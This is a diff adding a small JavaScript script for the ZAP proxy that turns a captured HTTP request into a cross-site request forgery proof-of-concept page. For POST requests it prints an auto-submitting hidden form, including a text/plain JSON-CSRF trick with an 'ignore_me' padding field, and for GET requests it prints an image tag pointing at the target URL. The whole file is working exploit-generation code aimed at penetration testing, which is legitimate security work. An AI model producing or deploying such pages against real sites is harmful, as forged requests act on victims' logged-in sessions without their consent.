@@ -1,0 +1,47 @@
+//csrf poc generater supporting json csrf
+//it will print results to the zap script console. you will have to copy paste it from there
+// released under the Apache v2.0 licence.
+//You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
+
+function invokeWith(msg) {
+	print("\n\n\n");
+	print("<!DOCTYPE html>\n");
+	print("<head>\n <title>CSRF POC</title>\n</head>");
+	print("<body>");
+	if(msg.getRequestHeader().getMethod().toString()== "POST"){
+	body = msg.getRequestBody().toString();
+	body = body.trim();
+	if(isJson(body))
+		print("<form action=\""+ msg.getRequestHeader().getURI().toString() +"\" id=\"formid\" method=\"post\" enctype=\"text/plain\">" );
+	else
+		print("<form action=\""+ msg.getRequestHeader().getURI().toString() +"\" id=\"formid\" method=\"post\">");
+	if(!isJson(body)){	
+	body=body.split('&');
+	for(i=0;i<body.length;i++)
+	{
+		keyval = body[i].split('=')
+		print("<input type=\"hidden\" name=\""+decodeURIComponent(keyval[0])+"\" value=\""+decodeURIComponent(keyval[1])+"\" />");	
+	}
+	}
+	else{
+		print("<input type ='hidden' name='"+body.substring(0,body.length-1)+",\"ignore_me\":\"' value='something\"}'>");
+	}
+	print("</form>");
+	print("<script>document.getElementById('formid').submit();</script>");
+	}
+	else if(msg.getRequestHeader().getMethod().toString() == "GET"){
+	print("<img src=\""+msg.getRequestHeader().getURI().toString()+"\">");
+	}
+	print("</body></html>");
+}
+
+function isJson(str)
+{
+	try{
+		JSON.parse(str);
+	}
+	catch(e){
+		return false;
+	}
+		return true;
+}
